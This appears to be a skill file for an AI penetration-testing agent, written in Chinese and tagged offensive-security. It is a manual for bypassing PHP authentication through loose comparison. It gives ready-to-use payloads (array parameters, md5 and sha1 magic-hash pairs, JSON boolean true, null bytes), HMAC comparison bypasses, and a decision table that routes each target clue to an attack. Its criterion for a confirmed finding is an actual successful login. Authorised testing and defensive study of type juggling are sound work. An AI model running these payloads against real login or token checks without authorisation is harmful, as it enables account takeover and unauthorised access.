---
name: type-juggling
description: >
  PHP 松散比较/魔法哈希/数组参数绕过手册（== 宽松比较把不相等的密钥/token 判等）。
  来源：clown skill 知识库 type-juggling-test（285 行）提炼。
  触发条件：目标为 PHP 栈（.php 后缀/X-Powered-By/ThinkPHP/Laravel 线索）+ 认证/校验/签名比对接口。
metadata:
  tags: "php,type-juggling,magic-hash,loose-comparison,auth-bypass"
  category: "offensive-security"
---

# PHP 松散比较绕过手册（type_juggling）

> **为什么单列**：`==` 松散比较是 PHP 特有的整类认证绕过源，识别成本低（PHP 指纹 + 校验接口），
> 命中即认证绕过（高危）。与 SQL 注入无关联，纯应用层逻辑缺陷。
> **首要目标：证明服务端把不相等的密钥/token 经类型转换判为相等，而非猜出真密码。**

## 0. 快速启动 payload（认证/token 形态，逐个换）

```text
password[]=x        # 数组→比较函数报错/返回 null(松散下 null==0 成立)
password=
0
0e12345             # 魔法哈希形态
240610708           # md5 后为 0e 开头纯数字
QNKCDZO             # 同上,与 240610708 的 md5 松散相等
true                # JSON body: {"password":true}
[]
admin%00            # null 字节(老版本)
```

## 1. 松散比较 `==` 真值要点

- `'0e123' == '0e999'` → **true**（都解析为科学计数法数字 0）
- `'123a' == 123` → **true**（字符串转数字取前缀）
- `'' == null == false == 0` → 全等
- PHP 8 收紧了部分行为（字符串转数字规则变化），**以目标 PHP 大版本实测为准**——本机 `php -r` 验证：
  `php -r "var_dump('0e123'=='0e999');"`；无本机 PHP 用在线 sandbox。
- **假设翻转**：字段传数组 `password[]=x` → `md5(数组)` 报 warning 并返回 NULL →
  `NULL == NULL` 成立 → 两边都传数组即绕过（md5/sha1 校验场景通杀）。

## 2. 魔法哈希（md5/sha1 以 `0e` 开头纯数字）

原理：`md5('240610708') == md5('QNKCDZO')` → `'0e462097431906509019562988736854' == '0e830400451993494058024219903391'` → 科学计数法 0^大数 = 0 == 0 → **true**。

常用魔法哈希对：
```
md5:  240610708 ↔ QNKCDZO      0e1137126905 ↔ 0e807024049
      aabg7-Xs5GrQ ↔ AABg7-Xs5GrQ(变体多,备常用对)
sha1: aaroZmOk ↔ aaK1STfY      aaO8zKUF ↔ aaO8zKUF 变体
```
适用场景：`md5($user_token) == md5($secret)`、`== md5($flag)` 型校验；不知道原值也能过。

## 3. HMAC 松散比较绕过

`hash_hmac('sha256', $data, $key) != '0'` 或与字符串 `"0"`/`0` 宽松比较：
- HMAC 结果恒非空字符串 → 与 `0`/`''`/`false` 的比较在特定写法下恒真/恒假
- 看到 `!= '0'`、`== 0`、`!= false` 修饰哈希比较 → 直接按此假设构造

## 4. 路由决策

| 线索 | 下一步 |
|---|---|
| 源码/报错暴露 `==` 比较密码/token/HMAC | §0 快速 payload 逐个换 |
| `md5($a)==md5($b)` 或松散 sha1 | §2 魔法哈希 |
| `hash_hmac(...) != '0'` 类 | §3 HMAC 绕过 |
| 比较函数遇数组报错(warning/异常路径差异) | §1 假设翻转(数组参数) |

## 5. 验证与合规

- CONFIRMED 标准：用 payload 实际通过校验（登录成功/校验接口返回通过），证据=请求+响应原文。
- 影响写"能做什么"：绕过的是哪道校验（登录/签名/重置令牌比对）→ 对应能接管什么。
- 与 type-juggling 同源的 PHP 弱类型问题（`in_array` 松散、`switch` 松散）一并测；
  JSON API 传 `"password": true` 是无痕探针首选。
